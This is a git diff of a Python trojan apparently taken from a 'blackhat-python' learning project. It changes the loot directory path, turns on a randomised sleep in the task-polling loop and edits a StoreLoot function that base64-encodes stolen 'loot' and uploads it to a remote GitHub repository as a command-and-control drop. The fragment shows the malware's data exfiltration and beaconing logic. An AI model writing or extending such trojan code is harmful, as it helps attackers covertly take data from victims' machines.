@@ -16,7 +16,7 @@ MODULE_URL="/home/dks/Development/Python/blackhat-python"
 CONFIG_DIR="trojan_command/config/trojan_conf.json"
 CONFIG=[]
 
-LOOT_DIR="trojan_command/loot/%s/" % ID
+LOOT_DIR="trojan_command/loot/%s" % ID
 LOOT_NUM = 1
 
 MODULE_DIR="trojan_command/modules"
@@ -175,7 +175,7 @@ def GetConfig():
         else:
             print("No new task added...")
 
-        #sleep(random.randint(10,20))
+        sleep(random.randint(15,20))
             
 def StoreLoot(loot):
     global LOOT_NUM
@@ -184,7 +184,7 @@ def StoreLoot(loot):
     remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, "testing")
     #remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
     #repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
-    repo.create_file( remote_path, "testing...03/05", base64.b64encode(str(loot)) )
+    repo.create_file( remote_path, "testing...", base64.b64encode(loot) )
     LOOT_NUM += 1
 
     return
